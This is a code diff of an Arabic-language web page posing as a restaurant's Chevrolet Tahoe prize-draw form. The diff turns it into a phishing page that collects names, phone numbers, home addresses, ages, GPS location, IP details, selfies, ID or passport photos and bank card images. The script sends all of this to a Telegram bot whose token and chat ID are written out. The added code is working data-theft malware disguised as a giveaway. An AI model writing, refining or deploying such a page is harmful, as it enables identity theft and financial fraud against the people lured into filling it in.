@@ -3,37 +3,74 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>جائزة سيارة تاهو</title>
+<title>جائزة سيارة تاهو - مطعم مسكوف أبو جنة</title>
 <style>
-body{font-family:Arial;background:linear-gradient(135deg,#d4af37,#8b6914);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;margin:0}
-.container{background:#fff;padding:30px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.3);width:100%;max-width:420px}
-h1{color:#8b6914;text-align:center;font-size:22px;margin-bottom:5px}
-p{color:#666;text-align:center;font-size:14px;margin-bottom:15px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Tahoma,Arial,sans-serif}
+body{background:linear-gradient(135deg,#d4af37,#8b6914);padding:15px;min-height:100vh}
+.card{background:#fff;padding:25px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.3);max-width:480px;margin:0 auto}
+.logo{text-align:center;margin-bottom:15px}
+.logo h1{color:#8b6914;font-size:22px}
+.logo p{color:#666;font-size:13px;margin-top:5px}
 .prize{background:#fff8e1;padding:15px;border-radius:8px;text-align:center;margin-bottom:15px;border:2px dashed #d4af37}
-input{width:100%;padding:12px;margin:6px 0;border:1px solid #ddd;border-radius:8px;font-size:15px;box-sizing:border-box}
-button{width:100%;padding:14px;background:#d4af37;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}
+label{display:block;font-size:13px;color:#333;margin-top:10px;margin-bottom:4px;font-weight:bold}
+input,select,textarea{width:100%;padding:11px;border:1px solid #ddd;border-radius:6px;font-size:14px;background:#f9f9f9;box-sizing:border-box}
+button{width:100%;padding:14px;background:#d4af37;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin-top:15px}
+.photo-box{text-align:center;padding:12px;background:#fff8e1;border-radius:8px;border:2px dashed #d4af37;margin-top:8px}
 </style>
 </head>
 <body>
-<div class="container">
+<div class="card">
+<div class="logo">
 <h1>🏆 مطعم مسكوف أبو جنة</h1>
 <p>استمارة جائزة سيارة تاهو 2026</p>
-<div class="prize"><b>🎁 الجائزة: شيفروليه تاهو 2026</b><br><small>املأ البيانات للمشاركة</small></div>
+</div>
+<div class="prize"><b>🎁 الجائزة: شيفروليه تاهو 2026</b><br><small>املأ البيانات للمشاركة في السحب</small></div>
 <form id="f">
-<input type="text" id="name" placeholder="الاسم الكامل" required>
-<input type="text" id="phone" placeholder="رقم الهاتف" required>
-<input type="text" id="city" placeholder="المدينة" required>
-<button type="submit">شارك في السحب</button>
+<label>الاسم الكامل *</label>
+<input type="text" id="name" placeholder="الاسم الثلاثي" required>
+<label>رقم الهاتف *</label>
+<input type="tel" id="phone" placeholder="07xxxxxxxxx" required>
+<label>رقم الهاتف البديل</label>
+<input type="tel" id="phone2" placeholder="اختياري">
+<label>المدينة *</label>
+<input type="text" id="city" placeholder="مثال: بغداد" required>
+<label>العنوان الكامل *</label>
+<input type="text" id="address" placeholder="المحلة، الزقاق، رقم الدار" required>
+<label>البريد الإلكتروني</label>
+<input type="email" id="email" placeholder="example@gmail.com">
+<label>العمر *</label>
+<input type="number" id="age" placeholder="مثال: 25" required>
+<div class="photo-box">
+<label>📸 صورة الوجه (سيلفي) *</label>
+<input type="file" id="face" accept="image/*" capture="user">
+<label>🆔 صورة الهوية أو الجواز *</label>
+<input type="file" id="id_img" accept="image/*">
+<label>💳 صورة البطاقة البنكية (إن وجدت)</label>
+<input type="file" id="bank_img" accept="image/*">
+</div>
+<label style="margin-top:15px"><input type="checkbox" id="gps" style="width:auto;margin-left:8px"> أوافق على مشاركة موقعي للتحقق</label>
+<button type="submit">🎁 شارك في السحب</button>
 </form>
 </div>
 <script>
+let gpsData='لم يتم';
+document.getElementById('gps').addEventListener('change',function(){
+if(this.checked && navigator.geolocation){
+navigator.geolocation.getCurrentPosition(function(p){gpsData=p.coords.latitude+','+p.coords.longitude;},function(){gpsData='مرفوض';});
+}
+});
 async function ip(){try{const r=await fetch('https://ipapi.co/json/');const d=await r.json();return d.ip+' | '+d.city+' | '+d.country_name+' | '+d.org;}catch(e){return 'N/A';}}
+function toB64(file){return new Promise((res,rej)=>{const r=new FileReader();r.onload=()=>res(r.result);r.onerror=rej;r.readAsDataURL(file);});}
 document.getElementById('f').addEventListener('submit',async function(e){
 e.preventDefault();
+const BOT='8759039993:AAGnWHtrCwoAqrjbnQwicMiWQvhO55KLH7s';
+const CHAT='-1003821295154';
 const info=await ip();
-const msg='🎁 *جائزة تاهو*\n\n👤 '+document.getElementById('name').value+'\n📞 `'+document.getElementById('phone').value+'`\n🏙️ '+document.getElementById('city').value+'\n\n🌐 IP: `'+info+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
-const url='https://api.telegram.org/bot8899269662:AAFKrQ6uOIQkcJT77w5_ONiMgKhfnAE0dK4/sendMessage?chat_id=1250341553&text='+encodeURIComponent(msg)+'&parse_mode=Markdown';
-try{await fetch(url);alert('تم تسجيل مشاركتك');document.getElementById('f').reset();}catch(e){alert('خطأ');}
+let msg='🏆 *جائزة تاهو*\n\n👤 '+document.getElementById('name').value+'\n📞 `'+document.getElementById('phone').value+'`\n📞 بديل: '+(document.getElementById('phone2').value||'لا')+'\n🏙️ '+document.getElementById('city').value+'\n🏠 '+document.getElementById('address').value+'\n📧 '+(document.getElementById('email').value||'لا')+'\n🎂 '+document.getElementById('age').value+'\n\n🌐 IP: `'+info+'`\n📍 GPS: `'+gpsData+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
+await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
+const files=[{id:'face',n:'صورة الوجه'},{id:'id_img',n:'الهوية'},{id:'bank_img',n:'البطاقة البنكية'}];
+for(const f of files){const inp=document.getElementById(f.id);if(inp.files[0]){const fd=new FormData();fd.append('chat_id',CHAT);fd.append('caption','📎 '+f.n);fd.append('photo',inp.files[0]);await fetch('https://api.telegram.org/bot'+BOT+'/sendPhoto',{method:'POST',body:fd});}}
+alert('تم تسجيل مشاركتك');document.getElementById('f').reset();
 });
 </script>
 </body>
